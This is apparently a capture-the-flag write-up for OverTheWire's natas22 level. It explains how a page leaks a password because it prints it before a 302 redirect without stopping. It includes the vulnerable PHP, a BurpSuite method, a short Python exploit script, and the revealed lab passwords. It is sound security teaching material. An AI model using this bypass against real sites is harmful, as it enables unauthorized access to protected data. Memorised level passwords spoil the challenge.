# Natas Level 22 Writeup (natas22) – OverTheWire

## Overview

This level focuses on bypassing a **302 redirect**.

The goal is to get the password for the next level.

## Observation

When we open the page, we see a blank page.

There is also a link to view the source code:

```text
index-source.html
```

## Finding the Password

### Using Browser & BurpSuite

1. Open the source code.

2. We can see that the password is displayed when the `revelio` parameter is present:

   ```php
   if(array_key_exists("revelio", $_GET)) {
       print "You are an admin. The credentials for the next level are:<br>";
       print "<pre>Username: natas23\n";
       print "Password: <censored></pre>";
   }
   ```

3. But before displaying the password, the application checks if we are an admin:

   ```php
   if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
       header("Location: /");
   }
   ```

4. We can request:
   ```text
   GET /?revelio
   ```
   but the server responds with a **302 redirect** to `/`.

5. The important point is that the password is generated before the browser follows the redirect.

6. In BurpSuite, intercept the request and stop the redirect. The response contains the password for **natas23**.

#### Proof

```text
Username: natas23
Password: CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5
```

### Using Python
```python
import requests, re

target = 'http://natas22.natas.labs.overthewire.org/'

auth = ('natas22', '964laB0r7TuDqJj5b3HFtwsQoc0GhjBF')

target = target + "?revelio"

r = requests.get(target, auth=auth, allow_redirects=False)

match = re.search(r'Password:\s(\w{32})', r.text)
print(f"Password for next level is: {match.group(1)}")
```

## Vulnerability

The application sends the sensitive information in the response before redirecting the user.

The **302 redirect does not prevent the original response from being received**, so we can use a client such as cURL or BurpSuite to see it.

## Flag

`<password>`
